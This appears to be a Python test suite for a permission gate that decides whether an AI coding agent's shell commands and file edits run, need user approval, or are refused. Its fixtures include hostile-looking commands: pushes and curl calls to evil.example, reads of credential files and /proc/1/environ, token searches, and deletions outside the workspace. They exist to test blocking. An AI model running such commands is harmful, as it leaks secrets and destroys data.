"""bridge/cc_gate.py: Textcrew's gate for Claude Code's commands and file changes (a PreToolUse hook).

The rules: reading, searching, work inside the workspace and local git run without asking; network commands
while Scout's browser is on, changing git's remotes and deleting or overwriting files outside the workspace
ask the user first (through the backend); the platform's own files and deleting a branch on GitHub are never
allowed. Bash, Edit, Write and NotebookEdit are on no allow list, so whatever is not an "allow" from the gate
(a crash, a timeout, no answer) refuses the call.
"""

import json
import os
import subprocess
import sys
import tempfile
import threading
import unittest
from http.server import BaseHTTPRequestHandler, HTTPServer

from bridge import cc_gate
from bridge.cc_gate import ALLOW, ASK, NEVER, Context, bash, decide
from bridge.claude import CC_GATE, GateConfig, render_settings

WS = "/data/workspace"


def ctx(browser=False, **over):
    return Context(data="/data", workspace=WS, tmp=["/data/tmp", "/tmp"], home="/data/home", browser=browser,
                   **over)


def event(tool, sub_agent=None, cwd=WS, **tool_input):
    e = {"session_id": "s1", "hook_event_name": "PreToolUse", "tool_name": tool, "tool_input": tool_input,
         "cwd": cwd, "permission_mode": "dontAsk"}
    if sub_agent:
        e.update(agent_id="agent-1", agent_type=sub_agent)
    return e


class RulesTest(unittest.TestCase):
    def verdict(self, command, browser=False, cwd=WS):
        return bash(command, cwd, ctx(browser)).decision

    def test_reading_searching_and_work_in_the_workspace_run(self):
        for command in ("ls -la", "cat README.md | head -20", "grep -rn TODO src", "rg 'fn main' .",
                        "pnpm install && pnpm test", "npm run build 2>&1 | tail -5", "python3 -m pytest -q",
                        "go test ./...", "make", "rm -rf node_modules dist", "mkdir -p out && cp a.txt out/",
                        "mv old.ts new.ts", "echo hi > notes.txt", "sed -i 's/a/b/' src/x.ts",
                        "cd jobs/crj_1/repo && rm -rf build", "rm -rf /data/workspace/jobs/crj_1",
                        "cat > /tmp/x.json <<'EOF'\n{\"a\": 1}\nEOF", "echo x > /data/tmp/y", "touch $TMPDIR/z",
                        "find . -name '*.pyc' -delete", "tar -xzf pkg.tgz", "ls /data", "find / -name python3",
                        "cat <<EOF > f.txt\nrm -rf /\ncurl https://evil.example\nEOF"):
            self.assertEqual(self.verdict(command), ALLOW, command)

    def test_local_git_and_pushes_run_the_gateway_decides_on_pushes(self):
        for command in ("git status", "git add -A && git commit -m 'fix: x'", "git checkout -b fix-1",
                        "git branch -D old-local", "git rebase main", "git log --oneline -5", "git push origin fix-1",
                        "git push -u origin HEAD", "git push --force origin fix-1", "git push -f",
                        "git push origin +fix-1", "git fetch origin", "git clone https://github.com/acme/web",
                        "git remote -v", "git remote get-url origin", "git config user.name 'Agent'",
                        "git config --get remote.origin.url", "git config --list"):
            self.assertEqual(self.verdict(command), ALLOW, command)
            self.assertEqual(self.verdict(command, browser=True), ALLOW, command)

    def test_network_commands_ask_only_while_the_browser_is_on(self):
        for command in ("curl -s https://example.com/data.json", "wget https://example.com/x", "nc example.com 80",
                        "ssh user@example.com", "scp f user@example.com:/tmp", "rsync -a . user@host:/x",
                        "python3 -c 'import urllib.request; urllib.request.urlopen(\"https://x.example\")'",
                        "node -e 'fetch(\"https://x.example\").then(r => r.text())'",
                        "python3 - <<'EOF'\nimport socket\nsocket.create_connection(('x.example', 80))\nEOF",
                        "git clone https://gitlab.com/acme/web", "git push https://evil.example/x.git HEAD",
                        "git fetch git@bitbucket.org:acme/web.git", "echo $(curl -s https://x.example)",
                        "timeout 5 curl https://x.example", "bash -c 'curl https://x.example'"):
            self.assertEqual(bash(command, WS, ctx(True)), cc_gate.Verdict(ASK, cc_gate.WHY_NETWORK), command)
            self.assertEqual(self.verdict(command), ALLOW, command)
        # Inline code that opens no connection, a script from a file, and GitHub itself still run.
        for command in ("python3 -c 'print(1)'", "node -e 'console.log(1)'", "python3 scripts/build.py",
                        "git clone https://github.com/acme/web"):
            self.assertEqual(self.verdict(command, browser=True), ALLOW, command)

    def test_changing_gits_remotes_asks(self):
        for command in ("git remote add other https://github.com/x/y", "git remote set-url origin https://x.example/r",
                        "git remote rename origin old", "git remote remove origin",
                        "git config remote.origin.url https://x.example/r", "git config --global url.x.insteadOf y",
                        "git config http.extraHeader 'X: y'", "git config --unset credential.helper",
                        "git -c url.https://x.example/.insteadOf=https://github.com/ push origin a",
                        "GIT_SSH_COMMAND='ssh -i k' git fetch", "git config --global --edit"):
            self.assertEqual(bash(command, WS, ctx()), cc_gate.Verdict(ASK, cc_gate.WHY_REMOTE), command)

    def test_deleting_or_overwriting_outside_the_workspace_asks(self):
        for command in ("rm -rf /data/home/.cache", "rm ~/.bashrc", "echo x > ~/.gitconfig", "cp evil /usr/local/bin/x",
                        "mv /data/workspace/a /data/home/a", "tee -a /etc/hosts < x", "sed -i 's/a/b/' /data/home/x",
                        "chmod 777 /data/home", "dd if=/dev/zero of=/data/home/disk", "rm -rf ../../home",
                        "cd /data/home && rm -rf .", "find /data/home -name x -delete", "rm -rf /data/workspace",
                        "if true; then rm -rf /data/home; fi", "echo ok#; rm -rf /etc/x", "sudo rm -rf /opt/x",
                        "truncate -s 0 /data/home/log", "ln -sf /x /data/home/y", "tar -xzf p.tgz -C /data/home"):
            self.assertEqual(bash(command, WS, ctx()), cc_gate.Verdict(ASK, cc_gate.WHY_OUTSIDE), command)
        # What it changes can't be told: asked too.
        for command in ('rm -rf "$SOMEWHERE"', 'for f in *.log; do rm "$f"; done', "find . -print0 | xargs -0 rm",
                        "cd - && rm -rf x", "rm -rf $(cat list.txt)"):
            self.assertEqual(self.verdict(command), ASK, command)

    def test_the_platforms_files_and_deleting_a_branch_are_never_allowed(self):
        for command in ("cat /data/.platform/platform.json", "cat ../.platform/platform.json",
                        "grep -r token /data", "rg secret /", "tar czf x.tgz /data", "cat /data/claude/.credentials.json",
                        "cp -r /data/hermes x", "echo $CLAUDE_CONFIG_DIR", "cat ${PLATFORM_FILE}", "cat /proc/1/environ",
                        "base64 /data/.platform/gitconfig", "cd /data && cat .platform/platform.json",
                        "ln -s /data/.platform x", "echo $(cat /data/.platform/platform.json)"):
            self.assertEqual(bash(command, WS, ctx(True)), cc_gate.Verdict(NEVER, cc_gate.NEVER_FILES)
                             if "grep -r" not in command and "rg " not in command and "tar " not in command
                             else cc_gate.Verdict(NEVER, cc_gate.NEVER_SEARCH), command)
        for command in ("git push origin --delete fix-1", "git push origin :fix-1", "git push -d origin fix-1",
                        "git push --mirror", "git push --prune origin", "git push origin +:fix-1"):
            self.assertEqual(bash(command, WS, ctx()), cc_gate.Verdict(NEVER, cc_gate.NEVER_DELETE), command)

    def test_a_link_into_the_platforms_files_counts_as_them(self):
        with tempfile.TemporaryDirectory() as d:
            data = os.path.join(d, "data")
            os.makedirs(os.path.join(data, ".platform"))
            os.makedirs(os.path.join(data, "workspace"))
            os.symlink(os.path.join(data, ".platform"), os.path.join(data, "workspace", "p"))
            c = Context(data=data, workspace=os.path.join(data, "workspace"), tmp=["/tmp"])
            self.assertEqual(bash("cat p/platform.json", c.workspace, c).decision, NEVER)
            self.assertEqual(decide(event("Read", file_path=os.path.join(c.workspace, "p", "x")), c).decision, NEVER)

    def test_an_unreadable_command_is_refused_not_asked(self):
        self.assertEqual(bash("echo 'unclosed", WS, ctx()), cc_gate.Verdict(NEVER, cc_gate.UNREADABLE))

    def test_file_tools(self):
        c = ctx()
        self.assertEqual(decide(event("Edit", file_path="/data/workspace/src/a.ts"), c).decision, ALLOW)
        self.assertEqual(decide(event("Write", file_path="notes/today.md"), c).decision, ALLOW)
        self.assertEqual(decide(event("Write", file_path="/tmp/scratch.txt"), c).decision, ALLOW)
        self.assertEqual(decide(event("Write", file_path="/data/home/.bashrc"), c),
                         cc_gate.Verdict(ASK, cc_gate.WHY_OUTSIDE))
        self.assertEqual(decide(event("NotebookEdit", notebook_path="/opt/n.ipynb"), c).decision, ASK)
        self.assertEqual(decide(event("Edit", file_path="/data/.platform/claude-settings.json"), c).decision, NEVER)
        self.assertEqual(decide(event("Write", file_path="../claude/settings.json"), c).decision, NEVER)
        # Reading and searching: never the platform's files; Claude Code's own saved tool output is fine.
        self.assertEqual(decide(event("Read", file_path="/data/workspace/README.md"), c).decision, ALLOW)
        self.assertEqual(decide(event("Read", file_path="/data/.platform/platform.json"), c).decision, NEVER)
        self.assertEqual(decide(event("Read", file_path="/data/claude/projects/x/tool-results/1.txt"), c).decision,
                         ALLOW)
        self.assertEqual(decide(event("Grep", pattern="token", path="/data"), c).decision, NEVER)
        self.assertEqual(decide(event("Grep", pattern="token"), c).decision, ALLOW)
        self.assertEqual(decide(event("Glob", pattern="/data/.platform/*"), c).decision, NEVER)
        self.assertEqual(decide(event("Glob", pattern="src/**/*.ts"), c).decision, ALLOW)
        # A tool the gate does not decide on.
        self.assertEqual(cc_gate.run(event("TodoWrite"), c), ("allow", ""))


class FakeGate:
    """The backend's /mcp/gate: answers what `answers` says, in order, and keeps what it was sent."""

    def __init__(self, answers):
        self.answers = list(answers)
        self.seen = []
        outer = self

        class Handler(BaseHTTPRequestHandler):
            def do_POST(self):
                body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
                outer.seen.append({"auth": self.headers.get("Authorization"), "body": body})
                answer = outer.answers.pop(0) if outer.answers else {"decision": "asked", "message": "asked"}
                status = answer.pop("_status", 200)
                raw = json.dumps(answer).encode()
                self.send_response(status)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(raw)))
                self.end_headers()
                self.wfile.write(raw)

            def log_message(self, *args):
                pass

        self.server = HTTPServer(("127.0.0.1", 0), Handler)
        self.url = f"http://127.0.0.1:{self.server.server_address[1]}/mcp/gate"
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    def close(self):
        self.server.shutdown()
        self.server.server_close()


class AskTest(unittest.TestCase):
    """An "asks first" call goes to the backend with the container's token; only its `allow` lets it run."""

    def setUp(self):
        self.dir = tempfile.TemporaryDirectory()
        self.platform = os.path.join(self.dir.name, "platform.json")
        with open(self.platform, "w") as fh:
            json.dump({"user_id": "u1", "mcp_token": "tok-gate", "bridge_secret": "b", "litellm_key": "k"}, fh)
        self.old_env = {k: os.environ.get(k) for k in ("NO_PROXY", "no_proxy")}
        os.environ["NO_PROXY"] = os.environ["no_proxy"] = "127.0.0.1"

    def tearDown(self):
        self.dir.cleanup()
        for k, v in self.old_env.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v

    def hook(self, gate_url, ev, browser=True):
        """The hook run the way Claude Code runs it: its settings' command through `sh -c`, the event on stdin."""
        cfg = GateConfig(data_dir="/data", workspace=WS, gate_url=gate_url, platform_file=self.platform,
                         browser=browser)
        (group,) = [g for g in render_settings(cfg)["hooks"]["PreToolUse"] if CC_GATE in g["hooks"][0]["command"]]
        hook = group["hooks"][0]
        done = subprocess.run(["sh", "-c", hook["command"]], input=json.dumps(ev), capture_output=True, text=True,
                              timeout=hook["timeout"], env={**os.environ})
        out = json.loads(done.stdout)["hookSpecificOutput"] if done.stdout.strip() else None
        return done.returncode, out

    def test_asked_then_allowed_once(self):
        fake = FakeGate([
            {"decision": "asked", "approvalId": "apr_1", "message": "Your user was asked to approve this. End your turn now."},
            {"decision": "allow", "approvalId": "apr_1", "message": "Your user approved this. It runs once."},
            {"decision": "asked", "approvalId": "apr_2", "message": "Your user was asked to approve this. End your turn now."},
        ])
        try:
            ev = event("Bash", command="curl -s https://example.com/data.json")
            code, out = self.hook(fake.url, ev)
            self.assertEqual((code, out["permissionDecision"]), (0, "deny"))
            self.assertIn("End your turn now", out["permissionDecisionReason"])
            code, out = self.hook(fake.url, ev)
            self.assertEqual(out["permissionDecision"], "allow")
            code, out = self.hook(fake.url, ev)
            self.assertEqual(out["permissionDecision"], "deny")
            # The backend got the exact call, why, and the container's token.
            self.assertEqual(fake.seen[0]["auth"], "Bearer tok-gate")
            self.assertEqual(fake.seen[0]["body"], {"tool": "Bash", "target": "curl -s https://example.com/data.json",
                                                    "why": cc_gate.WHY_NETWORK, "cwd": WS})
        finally:
            fake.close()

    def test_a_crew_jobs_refusal_and_a_specialists_call(self):
        fake = FakeGate([{"decision": "refused", "message": "This is not covered by the job's brief."}])
        try:
            _, out = self.hook(fake.url, event("Write", sub_agent="byte", file_path="/data/home/.npmrc"))
            self.assertEqual(out["permissionDecision"], "deny")
            self.assertIn("not covered by the job's brief", out["permissionDecisionReason"])
            self.assertIn("You are a specialist", out["permissionDecisionReason"])
            self.assertEqual(fake.seen[0]["body"]["tool"], "Write")
            self.assertEqual(fake.seen[0]["body"]["target"], "/data/home/.npmrc")
        finally:
            fake.close()

    def test_what_runs_without_asking_never_reaches_the_backend(self):
        fake = FakeGate([])
        try:
            _, out = self.hook(fake.url, event("Bash", command="pnpm test"))
            self.assertEqual(out["permissionDecision"], "allow")
            _, out = self.hook(fake.url, event("Bash", command="cat /data/.platform/platform.json"))
            self.assertEqual(out["permissionDecision"], "deny")
            self.assertEqual(fake.seen, [])
        finally:
            fake.close()

    def test_it_fails_closed(self):
        ev = event("Bash", command="curl https://example.com")
        # The backend can't be reached, or answers something else: refused, with the reason.
        for url in ("http://127.0.0.1:9/mcp/gate", ""):
            _, out = self.hook(url, ev)
            self.assertEqual(out["permissionDecision"], "deny", url)
            self.assertIn("could not be asked", out["permissionDecisionReason"])
        fake = FakeGate([{"_status": 500, "error": "x"}, {"decision": "maybe"}])
        try:
            for _ in range(2):
                self.assertEqual(self.hook(fake.url, ev)[1]["permissionDecision"], "deny")
        finally:
            fake.close()
        # The platform file can't be read: refused.
        os.remove(self.platform)
        fake = FakeGate([{"decision": "allow"}])
        try:
            self.assertEqual(self.hook(fake.url, ev)[1]["permissionDecision"], "deny")
            self.assertEqual(fake.seen, [])
        finally:
            fake.close()
        # Nothing it can read: no answer at all, so the session's rules decide, and they allow no Bash.
        done = subprocess.run([sys.executable, "-I", CC_GATE], input="not json", capture_output=True, text=True,
                              timeout=20)
        self.assertEqual((done.returncode, done.stdout), (0, ""))

    def test_a_crash_inside_the_gate_refuses_a_command(self):
        import io
        from unittest import mock
        out = io.StringIO()
        with mock.patch.object(cc_gate, "run", side_effect=RuntimeError("boom")), \
                mock.patch.object(sys, "stdin", io.StringIO(json.dumps(event("Bash", command="ls")))), \
                mock.patch.object(sys, "stdout", out):
            self.assertEqual(cc_gate.main([]), 0)
        self.assertEqual(json.loads(out.getvalue())["hookSpecificOutput"]["permissionDecision"], "deny")
        # A read that the gate could not check: no answer, the session's rules apply (reading is allowed, the
        # deny rules keep the platform's files).
        out = io.StringIO()
        with mock.patch.object(cc_gate, "run", side_effect=RuntimeError("boom")), \
                mock.patch.object(sys, "stdin", io.StringIO(json.dumps(event("Read", file_path="a")))), \
                mock.patch.object(sys, "stdout", out):
            cc_gate.main([])
        self.assertEqual(out.getvalue(), "")

    def test_it_runs_on_its_own(self):
        with open(CC_GATE, encoding="utf-8") as fh:
            source = fh.read()
        self.assertNotIn("from .", source)
        self.assertNotIn("import bridge", source)
        # Nothing secret on its command line: it reads the token from the platform file.
        cfg = GateConfig(platform_file=self.platform)
        command = render_settings(cfg)["hooks"]["PreToolUse"][1]["hooks"][0]["command"]
        self.assertNotIn("tok-gate", command)


class CrewJobTest(unittest.TestCase):
    def test_the_job_rules_say_what_the_brief_covers(self):
        from bridge import crew
        for member in ("byte", "patch"):
            text = crew.job_instructions(member, "/data/workspace/jobs/crj_1")
            self.assertIn("The brief is the user's yes for what it asks and nothing more", text)
            self.assertIn("**Needs your OK**", text)
        self.assertIn("needs the user's OK (git's refusal says they were asked)", crew.BYTE.prompt)


class HermesTest(unittest.TestCase):
    """Hermes has no gate hook: its own prompts for dangerous commands are answered "deny", always. Its pushes
    meet the git gateway's rules like Claude Code's (tested in the backend)."""

    def test_hermes_still_denies_its_own_approval_prompts(self):
        from bridge.hermes import HermesClient
        self.assertEqual(HermesClient("http://127.0.0.1:1", "k").approval_choice, "deny")
        with open(os.path.join(os.path.dirname(cc_gate.__file__), "__main__.py"), encoding="utf-8") as fh:
            self.assertIn('approval_choice=env.get("BRIDGE_HERMES_APPROVAL", "deny")', fh.read())


if __name__ == "__main__":
    unittest.main()
